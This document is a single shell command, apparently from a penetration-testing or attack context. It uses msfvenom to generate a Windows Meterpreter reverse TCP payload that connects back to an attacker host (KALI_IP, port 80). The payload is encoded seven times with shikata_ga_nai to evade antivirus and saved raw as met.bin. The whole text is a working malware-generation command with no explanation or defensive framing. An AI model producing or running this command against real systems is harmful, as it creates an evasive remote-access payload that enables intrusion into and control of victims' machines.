```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
```